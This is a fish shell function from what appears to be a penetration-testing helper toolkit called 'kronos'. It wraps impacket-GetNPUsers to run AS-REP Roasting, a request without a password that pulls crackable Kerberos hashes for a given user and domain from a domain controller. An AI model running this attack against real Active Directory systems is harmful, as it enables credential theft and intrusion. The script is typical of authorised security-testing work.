# description: Run AS-REP Roasting using impacket-GetNPUsers
function _kronos_asrep_roast --description "Run AS-REP Roasting using impacket-GetNPUsers"
    argparse h/help u/username= d/domain= -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos asrep-roast [TARGET] [OPTIONS]"
        echo ""
        echo "Run AS-REP Roasting using impacket-GetNPUsers."
        echo ""
        echo "Arguments:"
        echo "  TARGET              DC IP, hostname, or nameserver (falls back to \$TGT_DC or \$TGT)"
        echo ""
        echo "Options:"
        echo "  -u, --username USER Provide username (falls back to \$TGT_USERNAME)"
        echo "  -d, --domain DOMAIN Target domain (falls back to \$TGT_AD_DOMAIN)"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $argv[1]
    if test -z "$target"
        if test -n "$TGT_DC"
            set target $TGT_DC
        else if test -n "$TGT"
            set target $TGT
        else
            echo "Error: Target IP/hostname/nameserver is required." >&2
            echo "Usage: kronos asrep-roast [TARGET] [OPTIONS]" >&2
            return 1
        end
    end

    set -l domain ""
    if set -q _flag_domain
        set domain $_flag_domain
    else if test -n "$TGT_AD_DOMAIN"
        set domain $TGT_AD_DOMAIN
    else
        echo "Error: Domain is required. Provide it via -d/--domain or ensure TGT_AD_DOMAIN is set." >&2
        return 1
    end

    set -l user ""
    if set -q _flag_username
        set user $_flag_username
    else if test -n "$TGT_USERNAME"
        set user $TGT_USERNAME
    else
        echo "Error: Username is required. Provide it via -u/--username or ensure TGT_USERNAME is set." >&2
        return 1
    end

    if not command -s impacket-GetNPUsers >/dev/null
        echo "Error: impacket-GetNPUsers not found in PATH." >&2
        return 1
    end

    echo "Running impacket-GetNPUsers against $target for user $user@$domain..."
    impacket-GetNPUsers "$domain/$user" -dc-ip $target -no-pass -request
end
